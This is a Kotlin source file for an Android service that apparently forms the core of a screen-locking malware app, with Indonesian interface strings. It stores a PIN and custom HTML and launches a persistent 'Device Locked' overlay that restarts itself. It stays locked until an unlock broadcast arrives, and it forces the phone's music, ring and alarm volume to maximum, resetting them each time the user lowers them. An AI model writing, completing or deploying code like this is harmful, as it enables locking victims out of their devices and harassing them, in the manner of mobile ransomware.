package com.sync.xxx

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

class LockOverlayService : Service() {

    companion object {
        const val EXTRA_PIN         = "pin"
        const val EXTRA_TITLE       = "title"
        const val EXTRA_CUSTOM_HTML = "custom_html"
        const val LOCK_TYPE_V3      = "v3_chat"
        private const val NOTIF_CHANNEL = "lock_overlay_channel"
        private const val NOTIF_ID      = 9901
    }

    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isVolumeReceiverRegistered = false
    
    private var audioManager: AudioManager? = null

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
            val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("is_locked", false).apply()
                val unlockIntent = Intent("com.sync.xxx.UNLOCK_FROM_UI").apply {
                    setPackage(packageName)
                }
                sendBroadcast(unlockIntent)
                stopSelf()
            }
        }
    }

    private val volumeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "android.media.VOLUME_CHANGED_ACTION") {
                setMaxVolume()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        
        startForegroundCompat()
        registerVolumeReceiver()
        setMaxVolume()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    correctPin = intent?.getStringExtra(EXTRA_PIN)         ?: correctPin
    lockTitle  = intent?.getStringExtra(EXTRA_TITLE)       ?: lockTitle
    customHtml = intent?.getStringExtra(EXTRA_CUSTOM_HTML) ?: ""

    // SIMPAN STATUS KE SHAREDPREFERENCES
    val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
    prefs.edit().apply {
        putBoolean("is_locked", true)
        putString("saved_pin", correctPin)
        putString("saved_title", lockTitle)
        putString("saved_html", customHtml)
        apply()
    }

    setMaxVolume()
    launchLockActivity()
    registerUnlockReceiver()

    return START_STICKY
}


    private fun setMaxVolume() {
        try {
            audioManager?.let { am ->
                val maxMusic = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic, 0)

                val maxRing = am.getStreamMaxVolume(AudioManager.STREAM_RING)
                am.setStreamVolume(AudioManager.STREAM_RING, maxRing, 0)
                
                val maxAlarm = am.getStreamMaxVolume(AudioManager.STREAM_ALARM)
                am.setStreamVolume(AudioManager.STREAM_ALARM, maxAlarm, 0)
            }
        } catch (e: Exception) {
            Log.e("LockOverlayService", "Gagal set max volume: ${e.message}")
        }
    }

    private fun registerVolumeReceiver() {
        if (isVolumeReceiverRegistered) return
        try {
            val filter = IntentFilter("android.media.VOLUME_CHANGED_ACTION")
            registerReceiver(volumeReceiver, filter)
            isVolumeReceiverRegistered = true
        } catch (e: Exception) {
            Log.w("LockOverlayService", "registerVolumeReceiver: ${e.message}")
        }
    }

    private fun launchLockActivity() {
        val lockIntent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            putExtra(EXTRA_PIN, correctPin)
            putExtra(EXTRA_TITLE, lockTitle)
            putExtra(EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(lockIntent)
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.w("LockOverlayService", "registerReceiver: ${e.message}")
        }
    }

    private fun startForegroundCompat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                NOTIF_CHANNEL, "Lock Overlay",
                NotificationManager.IMPORTANCE_LOW
            ).apply { setSound(null, null) }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        val notif: Notification = NotificationCompat.Builder(this, NOTIF_CHANNEL)
            .setContentTitle("Perangkat Terkunci")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        if (isVolumeReceiverRegistered) {
            try { unregisterReceiver(volumeReceiver) } catch (_: Exception) {}
            isVolumeReceiverRegistered = false
        }
    }
}
